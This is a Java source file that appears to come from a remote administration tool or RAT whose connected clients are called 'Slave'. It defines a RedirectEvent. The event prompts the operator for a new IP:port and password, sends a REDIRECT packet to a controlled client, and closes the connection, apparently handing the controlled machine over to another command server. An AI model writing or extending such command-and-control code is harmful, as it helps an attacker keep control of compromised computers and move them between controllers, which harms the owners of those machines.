package com.redpois0n.events;

import javax.swing.ImageIcon;

import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;
import com.redpois0n.packets.Header;
import com.redpois0n.packets.PacketBuilder;
import com.redpois0n.utils.IconUtils;
import com.redpois0n.utils.Util;

public class RedirectEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
	public String ip;
	public String pass;

	public RedirectEvent(String name) {
		super(name);
	}

	@Override
	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), ip, pass };
	}

	@Override
	public void perform(Slave sl) {
		PacketBuilder packet = new PacketBuilder(Header.REDIRECT);

		String[] str = ip.split(":");

		packet.add(str[0]);
		packet.add(str[1]);
		packet.add(pass);
		
		sl.addToSendQueue(packet);

		sl.closeSocket(new CloseException("Redirecting event"));
	}

	@Override
	public String toString() {
		return "Redirect";
	}

	@Override
	public boolean add() {
		String result = Util.showDialog("Redirect", "Input IP:Port to redirect to");
		if (result == null) {
			return false;
		}

		String result1 = Util.showDialog("Redirect", "Input new password");
		if (result1 == null) {
			return false;
		}
		ip = result.trim();
		pass = result1.trim();
		return true;
	}

	@Override
	public String getIcon() {
		return "redirect";
	}

}
